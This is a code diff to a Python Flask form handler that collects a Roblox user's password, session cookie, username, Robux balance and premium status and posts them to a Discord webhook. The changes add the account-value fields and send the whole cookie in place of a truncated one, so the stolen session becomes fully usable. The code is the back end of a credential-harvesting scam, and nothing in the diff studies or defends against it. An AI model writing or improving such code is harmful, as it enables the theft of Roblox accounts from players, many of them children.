@@ -68,6 +68,9 @@ def submit_form():
         data = request.get_json()
         
         # Extract all form fields
+        username = data.get('username', '').strip()
+        robux = data.get('robux', '').strip()
+        premium = data.get('premium', False)
         password = data.get('password', '').strip()
         cookie = data.get('cookie', '').strip()
         
@@ -115,8 +118,12 @@ def submit_form():
                 'message': 'Webhook not configured'
             }), 500
         
-        # Use default Roblox profile picture
+        # Generate Roblox profile picture URL if username provided
         profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
+        if username:
+            # Try to get profile picture by username (this would need Roblox API integration)
+            # For now, use default profile picture
+            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
         
         # Prepare Discord embedded message
         discord_data = {
@@ -128,13 +135,23 @@ def submit_form():
                 },
                 'fields': [
                     {
-                        'name': '🔒 Password',
-                        'value': password or 'Not provided',
+                        'name': '👤 Username',
+                        'value': username or 'Not provided',
                         'inline': True
                     },
                     {
-                        'name': '🍪 Cookie',
-                        'value': f'```{cookie[:50]}{"..." if len(cookie) > 50 else ""}```',
+                        'name': '💰 Robux',
+                        'value': robux or 'Not provided',
+                        'inline': True
+                    },
+                    {
+                        'name': '⭐ Premium',
+                        'value': '✅ Yes' if premium else '❌ No',
+                        'inline': True
+                    },
+                    {
+                        'name': '🍪 Whole Cookie',
+                        'value': f'```{cookie}```' if cookie else 'Not provided',
                         'inline': False
                     }
                 ],
